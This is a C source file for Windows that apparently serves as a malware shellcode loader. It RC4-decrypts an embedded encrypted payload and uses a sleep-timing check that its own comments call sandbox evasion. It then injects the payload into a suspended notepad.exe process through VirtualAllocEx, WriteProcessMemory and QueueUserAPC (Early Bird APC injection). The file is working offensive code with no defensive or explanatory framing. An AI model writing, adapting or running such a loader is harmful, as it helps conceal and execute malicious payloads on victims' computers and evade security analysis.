#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

// External variables representing the encrypted shellcode
extern unsigned char buf;
extern unsigned int buf_len;

// RC4 encryption function
void rc4(unsigned char* data, int len, const char* key) {
    int keylen = strlen(key);
    unsigned char s[256];
    for (int i = 0; i < 256; i++) {
        s[i] = i;
    }

    unsigned char j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }

    int i = 0;
    j = 0;
    for (int n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

// Function to simulate a delay, acts as a simple sandbox evasion
int DelayFunction() {
    clock_t start_t, end_t;
    double total_t;
    int i = 8;

    start_t = clock();
    printf("Sleeping for %d seconds\n", i);
    Sleep(i * 1000); // Sleep count in milliseconds.
    end_t = clock();
    printf("Sleep ended: end_t = %ld cycles\n", start_t);

    if (((double)(end_t - start_t) / CLOCKS_PER_SEC) < 4.5) {
        exit(0);
    }
    total_t = (double)(end_t - start_t) / CLOCKS_PER_SEC;
    printf("Total time taken by CPU: %f\n", total_t);

    return 0;
}

int main() {
    const char* key = "ntdll.dll";
    SIZE_T shellSize = buf_len;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // Simple sandbox evasion
    DelayFunction();

    // Create a suspended process (e.g., notepad.exe)
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    // Allocate memory in the target process, decrypt the shellcode, and execute it using APC
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    rc4((unsigned char*)&buf, buf_len, key);
    WriteProcessMemory(victimProcess, shellAddress, &buf, shellSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);

    return 0;
}
